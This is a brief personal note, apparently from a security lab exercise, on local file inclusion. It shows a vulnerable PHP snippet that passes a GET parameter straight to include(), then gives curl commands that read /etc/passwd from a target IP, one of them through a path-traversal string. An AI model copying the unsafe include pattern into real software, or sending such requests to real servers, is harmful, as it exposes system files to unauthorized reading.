---
title: LOCAL FILE INCLUSION
updated: 2023-11-01 06:47:43Z
created: 2023-11-01 06:38:58Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

`http://<SERVER>/?file=index.php`

```
if ($_GET['file']) {
include($_GET['file']);
} else {
header("Location: http://$_SERVER[HTTP_HOST]/index.php?file=home.php");
}
```

1. Try reading readable file:
`curl http://10.129.95.185/?file=/etc/passwd`
`curl http://10.129.95.185/?file=../../../../../../../etc/passwd`

